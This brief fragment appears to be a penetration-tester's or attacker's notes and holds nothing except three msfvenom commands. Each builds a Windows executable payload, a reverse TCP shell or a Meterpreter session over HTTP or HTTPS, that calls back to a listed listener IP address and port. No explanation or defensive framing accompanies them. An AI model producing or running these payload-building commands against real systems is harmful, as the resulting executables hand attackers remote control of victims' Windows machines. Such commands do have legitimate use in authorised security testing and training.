...
msfvenom -p windows/shell/reverse\_tcp lhost=116.62.152.86 lport=1234 -f exe -o test1.exe
...
msfvenom -p windows/meterpreter/reverse\_http lhost=10.236.32.154 lport=4445 -f exe -o test.exe
...
msfvenom -p windows/x64/meterpreter/reverse\_https lhost=10.236.0.30 lport=4445 -f exe -o test.exe
